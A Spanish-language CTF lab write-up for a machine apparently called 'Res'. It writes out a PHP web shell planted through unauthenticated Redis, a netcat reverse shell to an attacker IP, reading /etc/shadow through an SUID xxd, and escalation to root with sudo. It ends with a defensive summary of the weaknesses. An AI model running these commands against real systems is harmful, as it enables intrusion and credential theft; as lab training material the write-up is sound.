# Res

## Initial Scan
```
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
6379/tcp open  redis   Redis key-value store 6.0.7
```
## Enum
### HTTP 
Lo unico que parece que tengamos aqui es un servidor apache sin mas.
### Redis 
Podemos interactuar con el servicio redis sin ningún tipo de autenticación previa

## Exploit
Vamos a intentar subir una reverse shell al servicio web usando redis
```
IP> config set dir /var/www/html
IP> config set dbfilename redis.php
IP> set test " <?php system($_GET['cmd']); ?>"
```
Tras esto accedemos a esta URL y veremos que tenemos shell como www-data, convirtamos esto en una reverse shell
```
http://10.10.105.205/redis.php?cmd=whoami
```
Comprobamos que esta netcat en la maquina objetivo
```
http://10.10.105.205/redis.php?cmd=which%20netcat
```
Y aprovechamos esto
```
http://10.10.105.205/redis.php?cmd=nc%20-e%20/bin/bash%20IP%204444
```
## Privesc
Hay 2 usuarios a tener en cuenta el root y el no estandar
```
root:x:0:0:root:/root:/bin/bash
vianka:x:1000:1000:Res,,,:/home/vianka:/bin/bash
```
## Vianka
Hay un SUID en /usr/bin/xxd, podemos explotar esto y leer el shadow
```
/usr/bin/xxd /etc/shadow | /usr/bin/xxd -r
```
Podemos sacar el hash de la contraseña de vianka, la cual esta en rockyou.txt y con ello acceder a este usuario
## Root
```
User vianka may run the following commands on ubuntu:
    (ALL : ALL) ALL
```
Ejecutamos lo siguiente:
```
sudo -s
```
Y ya somos root

## Analisis de la intrusion
#### Unautenticated redis conection
Podemos conectarnos al servicio redis sin autenticación previa, esto nos permitio subir una reverse shell al servidor
#### Netcat -e
La versión de netcat del servidor permite el flag -e usado para invocar una reverse shell muy facilmente
#### xxd SUID
El archivo xxd tiene un SUID que nos permitio leer el /etc/shadow
#### Bad password police
La contraseña de vianka esta en rockyou.txt lo que nos permitio elevar privilegios a este desde www-data
#### Elevated permision for vianka
Vianka puede usar cualquier comando como cualquier usuario del sistema con su contraseña
